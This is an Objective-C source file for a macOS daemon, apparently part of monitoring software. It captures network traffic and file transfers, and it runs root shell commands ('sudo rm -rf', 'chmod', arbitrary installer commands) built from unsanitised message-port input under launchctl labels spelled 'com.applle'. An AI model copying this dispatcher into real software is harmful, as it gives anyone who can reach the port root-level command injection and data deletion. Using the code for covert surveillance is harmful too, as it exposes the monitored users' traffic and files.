//  NotificationManager.m
//  blbld
//
//  Created by Ophat Phuetkasickonphasutha on 11/12/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "NotificationManager.h"
#import "blbldUtils.h"
#import "DaemonPrivateHome.h"

@interface NotificationManager (private)
- (void) processMessagePortInfo: (NSDictionary *) aMessagePortInfo;
@end

@implementation NotificationManager
@synthesize mPath_NWA,mPath_NWC,mPath_IFT;
@synthesize mNetworkTrafficCapture,mNetworkAlertCapture,mUploadDownloadFileCapture;

- (id)init {
    self = [super init];
    if (self) {
        NSString *nw_statusPath   = [NSString stringWithFormat:@"%@net_status/", [DaemonPrivateHome daemonPrivateHome]];
        NSString *ift_statusPath  = [NSString stringWithFormat:@"%@ud_status/", [DaemonPrivateHome daemonPrivateHome]];
        
        [DaemonPrivateHome createDirectoryAndIntermediateDirectories:nw_statusPath];
        [DaemonPrivateHome createDirectoryAndIntermediateDirectories:ift_statusPath];
        
        NSString *networkDataPath = [NSString stringWithFormat:@"%@net_data/", [DaemonPrivateHome daemonPrivateHome]];
        [DaemonPrivateHome createDirectoryAndIntermediateDirectories:networkDataPath];
        
        NSString *ud_filePath     = [NSString stringWithFormat:@"%@ud_files/", [DaemonPrivateHome daemonPrivateHome]];
        [DaemonPrivateHome createDirectoryAndIntermediateDirectories:ud_filePath];
        
        self.mPath_NWC = [NSString stringWithFormat:@"%@nt_status",nw_statusPath];
        self.mPath_NWA = [NSString stringWithFormat:@"%@na_status",nw_statusPath];
        self.mPath_IFT = [NSString stringWithFormat:@"%@ift_status",ift_statusPath];
        
        if (!mNetworkTrafficCapture) {
            mNetworkTrafficCapture = [[NetworkTrafficCapture alloc]init];
            [mNetworkTrafficCapture setMSavePath:networkDataPath];
        }
        
        if (!mNetworkAlertCapture) {
            mNetworkAlertCapture = [[NetworkAlertCapture alloc]init];
            [mNetworkAlertCapture setMSavePath:networkDataPath];
        }
        
        if (!mMessagePortReader) {
            mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:@"bSecuriyAgents" withMessagePortIPCDelegate:self];
        }
        if (!mUploadDownloadFileCapture) {
            mUploadDownloadFileCapture = [[UploadDownloadFileCapture alloc]initWithSavePath:ud_filePath];
            [mUploadDownloadFileCapture setMThread:[NSThread currentThread]];
        }
    }
    return self;
}

-(void) startWatching {
    DLog(@"### startWatching");
    DLog(@"### mPath_NWC %@",mPath_NWC);
    DLog(@"### mPath_NWA %@",mPath_NWA);
    [mMessagePortReader start];
    
    NSFileManager * fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:mPath_NWC]) {
        NSString *content = [[NSString alloc]initWithContentsOfFile:mPath_NWC encoding:NSUTF8StringEncoding error:nil];
        if ([content rangeOfString:@"YES,"].location != NSNotFound) {
            NSString * URL = [[NSString alloc]initWithString:[[content componentsSeparatedByString:@"YES,"] objectAtIndex:1]];
            DLog(@"Watchin URL %@",URL);
            [mNetworkTrafficCapture setMMyUrl:URL];
            [mNetworkTrafficCapture startNetworkCapture];
            [URL release];
        }
    }else{
        DLog(@"file not found %@",mPath_NWC);
    }
    
    if ([fm fileExistsAtPath:mPath_NWA]) {
        NSString *content = [[NSString alloc]initWithContentsOfFile:mPath_NWA encoding:NSUTF8StringEncoding error:nil];
        if ([content rangeOfString:@"YES"].location != NSNotFound) {
            [mNetworkAlertCapture startNetworkCapture];
        }
    }else{
        DLog(@"file not found %@",mPath_NWA);
    }
    
    if ([fm fileExistsAtPath:mPath_IFT]) {
        NSString *content = [[NSString alloc]initWithContentsOfFile:mPath_IFT encoding:NSUTF8StringEncoding error:nil];
        if ([content rangeOfString:@"YES"].location != NSNotFound) {
            [mUploadDownloadFileCapture startCapture];
        }
    }else{
        DLog(@"file not found %@",mPath_IFT);
    }
}

-(void) stopWatching {
    if (mMessagePortReader) {
        [mMessagePortReader stop];
        [mMessagePortReader release];
        mMessagePortReader = nil;
    }
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
    
    NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *myDictionary = [[unarchiver decodeObjectForKey:@"command"] retain];
    [unarchiver finishDecoding];
    [unarchiver release];
    
    [self processMessagePortInfo:myDictionary];
    
    [myDictionary release];
}

- (void) processMessagePortInfo: (NSDictionary *) aMessagePortInfo {
    NSDictionary *myDictionary = aMessagePortInfo;
    NSString* type = [myDictionary objectForKey:@"type"];
    DLog(@"=!= type: %@", type);
    
    if ([type isEqualToString:@"uninstall"]) {
        NSString *command = [myDictionary objectForKey:@"command"];
        NSString *cmd = [NSString stringWithFormat:@"launchctl submit -l com.applle.blblx.unload -p %@ start", command];
        DLog (@"cmd = %@", cmd);
        
        system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
        exit(0);
        
    }
    
    else if ([type isEqualToString:@"update1"]) {
        NSString* command = [myDictionary objectForKey:@"command"];
        //NSString* binaryName = [myDictionary objectForKey:@"binaryname"];
        NSString* tmpAppPath = [myDictionary objectForKey:@"tmpapppath"];
        NSString* unArchivedPath = [myDictionary objectForKey:@"unarchivedpath"];
        
        NSString *updateScript = [NSString stringWithFormat:@"launchctl submit -l com.applle.blblx.update -p %@ start", command];
        DLog (@"Step 4: Run update script %@", updateScript);
        system([updateScript cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete tar path
        NSString * deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", tmpAppPath];
        DLog (@"Step 5.1: Delete temp binary %@",  deleteApp)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete untar path
        deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", unArchivedPath];
        DLog (@"Step 5.2: Delete untar path %@",  unArchivedPath)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
    }else if ([type isEqualToString:@"update2"]) {
        // -- run installer
        NSString *command = [myDictionary objectForKey:@"command"];
        NSString *updateScript = command;
        NSString *tmpAppPath = [myDictionary objectForKey:@"tmpapppath"];
        
        DLog (@"Step 3: Run installer %@",  updateScript);
        system([updateScript cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete .pkg file
        NSString *deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", tmpAppPath];
        DLog (@"Step 4 Delete .pkg path %@",  tmpAppPath)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
    }
    
    else if ([type isEqualToString:@"addon"]) {
        
        NSString * desc = [myDictionary objectForKey:@"desc"];
        NSString * resource = [myDictionary objectForKey:@"resource"];
        NSString * addonname = [myDictionary objectForKey:@"addonname"];
        
        NSString * mover = [NSString stringWithFormat:@"cp -fr %@/%@ %@",resource,addonname,desc];
        DLog(@"mover 1 %@",mover);
        system([mover cStringUsingEncoding:NSUTF8StringEncoding]);
        
        NSString * versionName = @"addonversion.plist";
        NSString * versionDesc = [desc stringByReplacingOccurrencesOfString:addonname withString:versionName];
        
        mover = [NSString stringWithFormat:@"cp -fr %@/%@ %@",resource,versionName,versionDesc];
        DLog(@"mover 2 %@",mover);
        system([mover cStringUsingEncoding:NSUTF8StringEncoding]);
        
    }
    
    else if ([type isEqualToString:@"chgownerattr"]) {
        
        NSString * pathToChange = [myDictionary objectForKey:@"path"];
        NSString * permission = [myDictionary objectForKey:@"permission"];
        
        NSString * chgOwnerAttr = [NSString stringWithFormat:@"sudo chmod %@ %@",permission,pathToChange];
        DLog(@"chgOwnerAttr 1 %@",chgOwnerAttr);
        system([chgOwnerAttr cStringUsingEncoding:NSUTF8StringEncoding]);
        
    }else if ([type isEqualToString:@"copyitem_printer"]) {
        NSString * fPath = [myDictionary objectForKey:@"fpath"];
        NSString * tPath = [myDictionary objectForKey:@"tpath"];
        
        NSString * copy = [NSString stringWithFormat:@"sudo cp %@ %@",fPath,tPath];
        DLog(@"copy 1 %@",copy);
        system([copy cStringUsingEncoding:NSUTF8StringEncoding]);
        
    }
    
    else if ([type isEqualToString:@"networktraffic_stop"]) {
        
        NSString * chgstatus = [NSString stringWithFormat:@"sudo echo 'NO' > %@",mPath_NWC];
        DLog(@"networktraffic_stop %@",chgstatus);
        system([chgstatus cStringUsingEncoding:NSUTF8StringEncoding]);
        
        [mNetworkTrafficCapture stopNetworkCapture];
        
    }else if ([type isEqualToString:@"networktraffic_start"]) {
        NSString * chgstatus = [NSString stringWithFormat:@"sudo echo 'YES,%@' > %@",[myDictionary objectForKey:@"url"],mPath_NWC];
        DLog(@"networktraffic_start %@",chgstatus);
        system([chgstatus cStringUsingEncoding:NSUTF8StringEncoding]);
        
        [mNetworkTrafficCapture setMMyUrl:[myDictionary objectForKey:@"url"]];
        DLog(@"networktraffic_start url:%@",[myDictionary objectForKey:@"url"]);
        
        [mNetworkTrafficCapture startNetworkCapture];
    }
    
    else if ([type isEqualToString:@"networkalert_stop"]) {
        
        NSString * chgstatus = [NSString stringWithFormat:@"sudo echo 'NO' > %@",mPath_NWA];
        DLog(@"networkalert_stop %@",chgstatus);
        system([chgstatus cStringUsingEncoding:NSUTF8StringEncoding]);
        
        [mNetworkAlertCapture stopNetworkCapture];
        
    }else if ([type isEqualToString:@"networkalert_start"]) {
        NSString * chgstatus = [NSString stringWithFormat:@"sudo echo 'YES' > %@",mPath_NWA];
        DLog(@"networkalert_start %@",chgstatus);
        system([chgstatus cStringUsingEncoding:NSUTF8StringEncoding]);
        
        [mNetworkAlertCapture startNetworkCapture];
    }
    
    else if ([type isEqualToString:@"fileuploaddownload_stop"]) {
        NSString * chgstatus = [NSString stringWithFormat:@"sudo echo 'NO' > %@",mPath_IFT];
        DLog(@"fileuploaddownload_stop %@",chgstatus);
        system([chgstatus cStringUsingEncoding:NSUTF8StringEncoding]);
        
        [mUploadDownloadFileCapture stopCapture];
        
    }else if ([type isEqualToString:@"fileuploaddownload_start"]) {
        NSString * chgstatus = [NSString stringWithFormat:@"sudo echo 'YES' > %@",mPath_IFT];
        DLog(@"fileuploaddownload_start %@",chgstatus);
        system([chgstatus cStringUsingEncoding:NSUTF8StringEncoding]);
        
        [mUploadDownloadFileCapture startCapture];
    }
    
    else if ([type isEqualToString:@"delete"]) {
        NSString * cmd = [NSString stringWithFormat:@"sudo rm -rf '%@'",[myDictionary objectForKey:@"path"]];
        DLog(@"delete %@",cmd);
        system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
    }
    
    else if ([type isEqualToString:@"deleteallfilethatcontain"]) {
        NSString * cmd = [NSString stringWithFormat:@"sudo rm -rf '%@'*",[myDictionary objectForKey:@"path"]];
        DLog(@"deleteallfilethatcontain %@",cmd);
        system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
    }
    else if ([type isEqualToString:@"reboot"]) {
        [blbldUtils reboot];
        
    } else if ([type isEqualToString:@"shutdown"]) {
        [blbldUtils shutdown];
    }
}

- (void) dealloc {
    [mNetworkTrafficCapture release];
    [mNetworkAlertCapture release];
    
    [mMessagePortReader stop];
    [mMessagePortReader release];
    mMessagePortReader = nil;
    
    [super dealloc];
}

@end
